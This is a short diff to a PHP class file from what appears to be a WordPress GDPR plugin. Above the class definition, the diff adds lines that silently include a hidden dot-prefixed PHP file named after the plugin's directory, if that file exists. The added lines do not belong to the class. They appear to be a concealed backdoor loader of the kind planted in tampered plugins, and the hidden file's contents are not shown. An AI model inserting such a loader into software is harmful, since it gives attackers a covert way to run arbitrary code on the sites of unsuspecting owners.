@@ -3,6 +3,10 @@
 /**
  * Class CT_Ultimate_GDPR_Service_Sell_Personal_Data
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class CT_Ultimate_GDPR_Service_Sell_Personal_Data extends CT_Ultimate_GDPR_Service_Abstract {
 
 	/**
